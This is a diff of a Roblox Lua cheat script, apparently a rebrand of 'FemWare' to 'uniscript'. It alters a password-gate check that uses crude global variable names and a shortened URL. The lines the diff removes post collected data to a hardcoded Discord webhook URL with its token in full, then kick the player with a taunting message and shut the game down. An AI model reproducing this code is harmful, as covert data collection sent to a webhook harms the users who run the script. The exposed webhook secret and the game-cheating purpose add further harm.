@@ -53,7 +53,7 @@ else
 	_G.Pussy = (_G.Pussy + 2) * 2
 end
 
-if _G.FemKess == "FemWare On Top" then
+if _G.FemKess == "uniscript On Top" then
 	if _G.GWagon == 6969 and _G.Anya == 420 and _G.Pussy == 4206969 and _G.Baka == "AmongUs" and _G.NotDrugs == "6969696969" and _G.SecondaryDrug == "https://maper.info/Xjquc" and game.PlaceId == 8343259840 then
 
 		local Success, Error = pcall(function()
@@ -2436,10 +2436,3 @@ else
 	local Headers = {["Content-Type"]="application/json"}
 	local Encoded = HttpService:JSONEncode(Data)
 
-	Request = http_request or request or HttpPost or syn.request
-	local Final = {Url = "https://discord.com/api/webhooks/973234402538717306/V-JTksACr1dAZIWrqgjSsB8ObIzED9m3-6ilJYlh5dMgtker1IpiMGugq0Gb4gvlzfcJ", Body = Encoded, Method = "POST", Headers = Headers}
-	Request(Final)
-	game.Players.LocalPlayer:Kick("Wrong Password little boy. Get the latest script over FemWare Official, discord.gg/ZaSETw4774")
-	wait(15)
-	game:Shutdown()
-end
